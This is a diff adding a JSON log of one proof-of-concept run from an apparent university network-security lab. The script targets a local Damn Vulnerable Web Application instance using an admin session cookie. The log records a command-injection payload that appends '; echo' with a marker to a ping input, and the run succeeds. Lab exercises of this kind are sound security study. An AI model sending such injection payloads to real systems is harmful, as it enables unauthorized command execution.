@@ -1,0 +1,32 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v2\\CMD-001__1.py",
+    "--base-url",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/exec/",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_low.cookie",
+    "--os-branch",
+    "linux"
+  ],
+  "started_at": "2026-10-20T14:41:51+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 3.226,
+  "stdout": "{\"result\": \"response\", \"status\": 200, \"marker_seen\": true, \"marker_count\": 1, \"normal_ping_output_seen\": true, \"payload_sent\": \"127.0.0.1; echo CMDINJ_MARKER_7f3a91\", \"output_head\": \"<!DOCTYPE html>\\n\\n<html lang=\\\"en-GB\\\">\\n\\n\\t<head>\\n\\t\\t<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=UTF-8\\\" />\\n\\n\\t\\t<title>Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA)</title>\\n\\n\\t\\t<link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"../../dvwa/css/main.css\\\" />\\n\\n\\t\\t<link rel=\\\"icon\\\" type=\\\"\\\\image/ico\\\" href=\\\"../../favicon.ico\\\" />\\n\\n\\t\\t<script type=\\\"text/javascript\\\" src=\\\"../../dv\"}\r\n",
+  "stderr": "",
+  "cohort": "v2",
+  "stem": "CMD-001__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v2\\CMD-001__1.py",
+  "args_redacted": [
+    "--base-url",
+    "http://127.0.0.1:9080",
+    "--path",
+    "/vulnerabilities/exec/",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_low.cookie",
+    "--os-branch",
+    "linux"
+  ]
+}
